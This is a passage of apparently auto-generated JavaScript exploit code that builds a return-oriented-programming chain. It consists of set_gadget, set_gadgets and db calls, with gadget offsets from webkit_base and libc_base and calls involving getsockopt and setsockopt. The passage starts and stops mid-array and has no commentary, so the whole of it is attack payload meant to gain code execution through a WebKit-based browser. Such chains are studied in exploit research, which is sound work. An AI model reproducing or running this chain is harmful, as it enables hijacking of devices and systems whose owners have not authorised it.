ropchain+184016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+184152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+184136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184280, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184376, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+184480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+184464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184592, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184688, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+186032, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+186104, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+186160, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+186272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+186472, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+186560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+186576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+186728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+186760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+186712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+186744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+186856, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+186840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+186960, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+188152, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+187096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+187080, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+187216, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187264, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+187248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+187376, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+187368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+187392, 
ropchain+187840, 
libc_base+50775, 
libc_base+793877, 
ropchain+187464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+187616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+187600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+187632, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+187720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187736, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+187832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+187816, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+187920, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+187904, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+188016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+188032, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+188144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+188128, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+189472, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+189544, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+189608, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([32, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+189760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+189776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+189928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+189960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+189912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+189944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+190080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+190064, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+190160, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+190264, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+190352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+190512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+190480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([51, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+190704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+190792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+190960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+190992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+190944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190976, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+191088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+191072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+191192, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+193264, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+191328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+191312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+191448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+191480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+191608, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+191600, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+191624, 
ropchain+192072, 
libc_base+50775, 
libc_base+793877, 
ropchain+191696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+191848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+191832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+191864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+191952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191968, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+192064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+192048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+192128, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+192216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+192232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+192384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+192368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+192400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+192576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+192544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+192528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+192704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192720, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+192688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+192816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192832, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+192944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192928, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+193032, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+193016, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+193128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+193144, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+193256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+193240, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
